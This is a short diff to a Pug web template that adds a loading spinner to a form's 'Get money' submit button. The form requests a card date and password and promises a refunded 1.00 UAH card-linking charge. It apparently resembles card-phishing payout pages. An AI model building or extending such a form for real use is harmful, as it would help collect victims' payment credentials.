@@ -18,4 +18,8 @@ block main
               +formItem('cardDate','form')
               +formItem('password','form')
             p.form__text Для привязки карты мы проведем платеж в размере 1.00 UAH, который будет возвращен в течение 30 минут
-            button(type="submit") Получить деньги
+            .form__button
+              button(type="submit") Получить деньги
+              .lds-ring
+                  - for(let i = 0; i < 4; i++)
+                      div
